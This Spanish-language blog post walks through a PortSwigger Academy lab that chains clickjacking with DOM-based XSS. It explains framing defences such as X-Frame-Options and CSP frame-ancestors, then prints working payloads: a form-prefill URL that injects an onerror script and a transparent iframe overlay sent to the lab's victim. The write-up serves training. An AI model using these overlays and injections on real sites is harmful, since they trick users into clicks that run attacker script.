---
title: "Exploiting clickjacking vulnerability to trigger DOM-based XSS"
date: 2025-04-01 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - Clickjacking
tags:
  - Clickjacking
  - Exploiting clickjacking vulnerability to trigger DOM-based XSS
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `vulnerabilidad de XSS` que se activa mediante un `click`. Debemos construir un `ataque de Clickjacking` que engañe al `usuario` para que haga `click` en el botón `"Click me"` y llame a la `función print()`

---

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/Clickjacking-Lab-4/image_1.png)

Si hacemos `click` sobre `Submit feedback` vemos que tenemos un `formulario` que podemos `rellenar`

![](/assets/img/Clickjacking-Lab-4/image_2.png)

Si enviamos algo de contenido nos responde con este `texto` y hace alusión al `nombre` que hemos `introducido`

![](/assets/img/Clickjacking-Lab-4/image_3.png)

Si pulsamos sobre `View post` vemos que hay una `sección` de `comentarios`

![](/assets/img/Clickjacking-Lab-4/image_4.png)

En un `ataque` de `Clickjacking`, el atacante `superpone` u `oculta elementos maliciosos` en una `página web legítima`, por ejemplo, usando un `iframe`, de modo que cuando el `usuario` hace `click` en un `elemento aparentemente seguro` de una `página web`, en realidad, está haciendo `click` en un `elemento oculto` y ejecutando una `acción no deseada`

Por ejemplo, un `usuario` accede a una `página web` (quizás mediante un `enlace` proporcionado por un `correo electrónico`) y hace `click` en un `botón` para ganar un `premio`. Sin saberlo, ha sido engañado por un `atacante` para presionar un `botón oculto`, lo que resulta la realización de una `compra` en otra `web`

Este `ataque` se diferencia de un `ataque CSRF` en que el `usuario` debe realizar una `acción`, como hacer `click en un botón`, mientras que un `ataque CSRF` se basa en la `suplantación` de una `solicitud completa` sin el `conocimiento` o la `interacción` del `usuario`

La `protección` contra los `ataques CSRF` suele proporcionarse mediante el uso de un `token CSRF` vinculado a una `cookie` de `sesión`. Los `tokens CSRF` no puede bloquear un `ataque de Clickjacking` porque el `navegador` enviará `automáticamente` el `token CSRF`, esto es debido a que el `ataque` ocurre dentro de la `sesión del usuario` y dentro del `propio dominio`. Por lo tanto, la única diferencia con una `sesión normal`, sería que el `proceso` ocurre dentro de un `iframe oculto`

Los `ataques de Clickjacking` utilizan `CSS` para crear y manipular `capas`. El `atacante` incorpora el `sitio web legítimo` como una `capa iframe` superpuesta sobre `elementos maliciosos`

Un `ejemplo` utilizando la `etiqueta style` y sus `parámetros` es el siguiente

```
<head>
    <style>
        #target_website {
            position: relative;
            width: 128px;
            height: 128px;
            opacity: 0.00001;
            z-index: 2;
        }
        #decoy_website {
            position: absolute;
            width: 300px;
            height: 400px;
            z-index: 1;
        }
    </style>
</head>
...
<body>
    <div id="decoy_website">
        ...decoy web content here...
    </div>
    <iframe id="target_website" src="https://vulnerable-website.com"></iframe>
</body>
```

El `iframe` del `sitio web legítimo` se `posiciona` dentro del `navegador` de manera que haya una `superposición precisa` de la `acción` con los `elementos maliciosos`, utilizando valores adecuados de `ancho`, `alto` y `posición`

Se emplean valores de `posición absoluta` y `relativa` para garantizar que el `sitio web objetivo` se `superponga` correctamente al `sitio de distracción`, sin importar el `tamaño de pantalla`, el `tipo de navegador` o la `plataforma`

El `z-index` determina el `orden de apilamiento` del `iframe` y las `capas del sitio web`. El valor de `opacidad` se define en `0.0` (o cerca de `0.0`), haciendo que el `contenido del iframe` sea `transparente` para el `usuario`

Hay algunas `protecciones contra Clickjacking` en los `navegadores` que pueden `detectar la transparencia en iframes` mediante `umbrales`. Para `eludir` esto, el `atacante` debe `ajustar los valores de opacidad` de manera que el `efecto deseado` se logre sin `activar` las `protecciones`. Esta `medida de protección` no está presente en `todos los navegadores`. Por ejemplo, `Chrome versión 76` incluye este `comportamiento`, pero `Firefox` no. Esto significa que, `según el navegador`, podemos necesitar `modificar` el `payload`

Aunque podemos `crear manualmente` una `PoC` de un `ataque de Clickjacking` como se describió anteriormente, esto puede ser `tedioso` y `consumir mucho tiempo`. Cuando `probamos` el `Clickjacking` en entornos reales, es recomendable usar la herramienta `Clickbandit` [https://portswigger.net/burp/documentation/desktop/tools/clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit) de `Burpsuite`, la cual nos permite usar nuestro `navegador` para `realizar las acciones deseadas` en la `página web cargada mediante el iframe` y luego `genera` un `archivo HTML` con una `superposición` para explotar el `Clickjacking`

Existen varias `medidas defensivas` contra `Clickjacking` del `lado del cliente`, sin embargo, a menudo, los `atacantes` pueden `eludir estas protecciones` con relativa `facilidad`. En consecuencia, se han desarrollado `protocolos implementados en el lado del servidor` que `restringen el uso de iframes` en el `navegador` y por lo tanto, `mitigan el Clickjacking`

El `Clickjacking` es un `comportamiento` que ocurre en el `lado del cliente`, y su `éxito` o `fracaso` depende de las `funcionalidades del navegador` y su `conformidad` con los `estándares web` y las `mejores prácticas actuales`. La `protección en el servidor` contra el `Clickjacking` se logra `definiendo` y `comunicando restricciones` sobre el `uso de componentes` como los `iframes`. No obstante, la `eficacia` de estas `protecciones` depende de que el `navegador` `cumpla` y `aplique` dichas `restricciones`

Dos `mecanismos clave` para la `protección contra Clickjacking` desde el `servidor` son `X-Frame-Options` y `Content Security Policy (CSP)`

`X-Frame-Options` - Fue introducido originalmente como una `cabecera de respuesta no oficial` en `Internet Explorer 8` y fue `rápidamente adoptado` por otros `navegadores`. Esta `cabecera` permite al propietario del sitio web `controlar el uso de iframes u objetos`, de modo que no es posible `cargar una página web desde en un iframe` puede ser `prohibida` con la `directiva deny`

```
X-Frame-Options: deny
```

Alternativamente, se puede `restringir` que un `iframe` cargue `contenido` solo si pertenece al `mismo origen` (mismo `dominio`, `protocolo` y `puerto`) que la `página que lo contiene`. Si el `origen` es `diferente`, el `iframe` no se `cargará`.

```
X-Frame-Options: sameorigin
```

O también puede `permitirse` únicamente que se `cargue` un `sitio web específico` en un `iframe` mediante la `directiva allow-from`

```
X-Frame-Options: allow-from https://normal-website.com
```

`Content Security Policy (CSP)` - Es un `mecanismo de detección y prevención` que proporciona `mitigación` contra ataques como `XSS` y de `Clickjacking`. `CSP` suele implementarse en el `servidor web` como un `encabezado de respuesta` con el siguiente formato

```
Content-Security-Policy: policy
```

La `Content Security Policy (CSP)` proporciona al `navegador` un `listado de fuentes` que considera `legítimas` (dominios, protocolos, scripts específicos) y que el `navegador` puede utilizar para la `detección` e `intercepción de comportamientos maliciosos`

La `protección recomendada contra Clickjacking` consiste en `incorporar` la `directiva frame-ancestors` en la `Content Security Policy (CSP)` de la aplicación

- La directiva `frame-ancestors 'none'` tiene un `comportamiento similar` a `X-Frame-Options: deny`
    
- La directiva `frame-ancestors 'self'` es `equivalente` a `X-Frame-Options: sameorigin`

La siguiente `Content Security Policy (CSP)` no permite que se `cargue la web` desde `otros sitios web externos` mediante un `iframe`. Sin embargo, sí que se puede `cargar la web` mediante un `iframe` si se hace desde la `misma web` que `aplica` la `Content Security Policy (CSP)`

```
Content-Security-Policy: frame-ancestors 'self';
```

Alternativamente, se puede `permitir` que solo se pueda `cargar la web` desde `sitios web específicos`

```
Content-Security-Policy: frame-ancestors normal-website.com;
```

Hay que recalcar que `X-Frame-Options` no está `implementado de forma uniforme` en todos los `navegadores` (por ejemplo, la `directiva allow-from` no es `compatible` con `Chrome 76` ni con `Safari 12`). Sin embargo, cuando se `aplica correctamente` junto con `Content Security Policy (CSP)`, puede proporcionar una `protección efectiva` contra `ataques de Clickjacking`

Para ver si una `web` es `vulnerable` a `Clickjacking` podemos usar la herramienta `shcheck` [https://github.com/santoru/shcheck.git]https://github.com/santoru/shcheck.git() para `identificar` las `cabeceras de seguridad`

```
# shcheck.py -i -x -k https://0a7b006303c26c1f81e366e3002500bf.web-security-academy.net/        

======================================================
 > shcheck.py - santoru ..............................
------------------------------------------------------
 Simple tool to check security headers on a webserver 
======================================================

[*] Analyzing headers of https://0a7b006303c26c1f81e366e3002500bf.web-security-academy.net/
[!] URL Returned an HTTP error: 404
[*] Effective URL: https://0a7b006303c26c1f81e366e3002500bf.web-security-academy.net/
[!] Missing security header: X-XSS-Protection
[!] Missing security header: X-Frame-Options
[!] Missing security header: X-Content-Type-Options
[!] Missing security header: Strict-Transport-Security
[!] Missing security header: Content-Security-Policy
[!] Missing security header: X-Permitted-Cross-Domain-Policies
[!] Missing security header: Referrer-Policy
[!] Missing security header: Expect-CT
[!] Missing security header: Permissions-Policy
[!] Missing security header: Cross-Origin-Embedder-Policy
[!] Missing security header: Cross-Origin-Resource-Policy
[!] Missing security header: Cross-Origin-Opener-Policy

[*] No information disclosure headers detected

[*] No caching headers detected
-------------------------------------------------------
[!] Headers analyzed for https://0a7b006303c26c1f81e366e3002500bf.web-security-academy.net/
[+] There are 0 security headers
[-] There are not 12 security headers
```

Si preferimos usar una herramienta `web` podemos usar `securityheaders` [https://securityheaders.com/](https://securityheaders.com/) 

![](/assets/img/Clickjacking-Lab-4/image_5.png)

En este caso, vemos que la `web` no tiene ni `Content-Security-Policy (CSP)` ni `X-Frame-Options`, lo cual la hace vulnerable a `Clickjacking`

Históricamente, el `Clickjacking` se ha utilizado para realizar acciones como `aumentar` los `"me gusta"` en una página de `Facebook`. Sin embargo, la verdadera potencia del `Clickjacking` se revela cuando se utiliza como un `vector para otro ataque`, como un `DOM XSS`. La implementación de este ataque combinado es relativamente sencilla, suponiendo que el atacante haya identificado primero la `vulnerabilidad` de `XSS`. Luego, el `exploit XSS` se combina con la `URL` del `iframe`, de modo que el usuario haga `click` en el `botón o enlace` y, en consecuencia, ejecute el ataque de `DOM XSS`

Si nos fijamos en el `código fuente` de la `página desde la que se envía el formulario` vemos que se `carga` un `archivo .js`

![](/assets/img/Clickjacking-Lab-4/image_6.png)

Si hacemos `click` sobre el `enlace` y accedemos a `/resources/js/submitFeedback.js` vemos este `código JavaScript`. Si nos fijamos bien se está usando `innerHTML`, esta propiedad es un `sink` que nos permite `inyectar código HTML y JavaScript`

![](/assets/img/Clickjacking-Lab-4/image_7.png)

`Enviamos` este `payload`

![](/assets/img/Clickjacking-Lab-4/image_8.png)

Al pulsar en `Submit feedback` vemos que podemos `inyectar código HTML`

![](/assets/img/Clickjacking-Lab-4/image_9.png)

Ahora vamos a `comprobar` que podemos `ejecutar código JavaScript`

![](/assets/img/Clickjacking-Lab-4/image_10.png)

Al pulsar sobre `Submit feedback` vemos que funciona

![](/assets/img/Clickjacking-Lab-4/image_11.png)

Algunos `sitios web` que requieren completar y enviar `formularios` permiten `rellenar previamente` los datos del `formulario` mediante `parámetros GET` antes del `envío`. Dado que los `valores GET` forman parte de la `URL`, la `URL de destino` puede `modificarse` para incorporar `valores elegidos por el atacante`

Hay otros `sitios web` que pueden requerir `interacción por parte del usuario`, como que el usuario `ingrese manualmente los datos`, complete `pasos previos` (como una `verificación CAPTCHA`) antes de `habilitar el envío`, etc

Para `comprobar` si `el formulario permite rellenar previamente los datos mediante parámetros GET`, lo primero que necesitamos hacer es `identificar` los `nombres` de los `campos`. En este caso vemos que el valor del campo a `rellenar` es `name`

![](/assets/img/Clickjacking-Lab-4/image_12.png)

El siguiente paso es `añadir` el `parámetro name` a la `URL` y ver si se `rellena` el `campo name del formulario`, para ello, accedemos a `https://0abc00e1044662e9828fa7c9008500b8.web-security-academy.net/feedback?name=test` y vemos que sí que funciona

![](/assets/img/Clickjacking-Lab-4/image_13.png)

Para `rellenar` los demás `campos` lo tenemos que hacer de esta manera. Lo que hace este `payload` es `rellenar` todos los `campos` del `formulario` y luego `desplazarnos` al id `feedbackResult`, el cual corresponde al `botón` del `envío`

```
/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult
```

![](/assets/img/Clickjacking-Lab-4/image_14.png)

Una vez comprobado esto vamos a `enlazar` ambas `vulnerabilidades` para causar un `mayor impacto`, para ello, nos dirigimos al `Exploit Server` y pegamos este `payload`

```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.3;
       z-index: 2;
   }
   div {
       position:absolute;
       top:620px;
       left:75px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0abc00e1044662e9828fa7c9008500b8.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

![](/assets/img/Clickjacking-Lab-4/image_15.png)

Pinchamos sobre `View exploit` y vemos que todo está bien centrado

![](/assets/img/Clickjacking-Lab-4/image_16.png)

`Cambiamos` la `opacidad` a `0`

```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0;
       z-index: 2;
   }
   div {
       position:absolute;
       top:620px;
       left:75px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0abc00e1044662e9828fa7c9008500b8.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

![](/assets/img/Clickjacking-Lab-4/image_17.png)

Probamos que funciona pulsando sobre `View exploit > Click me` y posteriormente le `enviamos` el `exploit` a la víctima pulsando `Deliver exploit to victim`

![](/assets/img/Clickjacking-Lab-4/image_18.png)

Otra forma alternativa sería usando la herramienta `Clickbandit` de `Burpsuite`, para usarla nos dirigimos a `Burpsuite` y pulsamos `Burp > Burp Clickbandit`

![](/assets/img/Clickjacking-Lab-4/image_19.png)

Pulsamos sobre `Copy Clickbandit to clipboard`

![](/assets/img/Clickjacking-Lab-4/image_20.png)

Nos dirigimos a `Chrome`, accedemos a `https://0abc00e1044662e9828fa7c9008500b8.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult`, nos abrimos la `consola de desarrollador` y `pegamos` ahí todo el `código`

![](/assets/img/Clickjacking-Lab-4/image_21.png)

Una vez hecho esto nos saldrá este `menú`

![](/assets/img/Clickjacking-Lab-4/image_22.png)

`Marcamos` la casilla `Disable click actions` para `desactivar` los `clicks`. Una vez hecho esto pulsamos en `Start`

![](/assets/img/Clickjacking-Lab-4/image_23.png)

Lo siguiente sería `pulsar sobre el botón que queremos`, en este caso sobre `Submit feedback` que es el que queremos usar para el `ataque de Clickjacking`

![](/assets/img/Clickjacking-Lab-4/image_24.png)

Una vez hecho esto, `pulsamos` sobre `Finish` y se nos `mostrará` como es nuestro `payload` actualmente

![](/assets/img/Clickjacking-Lab-4/image_25.png)

Usando los símbolos `-` y `+`, podemos `subir` o `bajar` el `aumento`, y con `Toogle transparency` podemos `activar` o `desactivar` la `transparencia`. En mi caso, lo voy a dejar de esta forma. Cuando ya lo tengamos como queremos, pulsamos en `Save` y se nos `descargará` un `documento HTML`

![](/assets/img/Clickjacking-Lab-4/image_26.png)

`Pegamos` el `código` en el `Exploit server`

![](/assets/img/Clickjacking-Lab-4/image_27.png)

Pulsamos sobre `View exploit` para ver si se ve correctamente

![](/assets/img/Clickjacking-Lab-4/image_28.png)

Hacemos `click sobre el botón` y vemos que podemos `explotar` el `XSS`

![](/assets/img/Clickjacking-Lab-4/image_29.png)

![](/assets/img/Clickjacking-Lab-4/image_30.png)
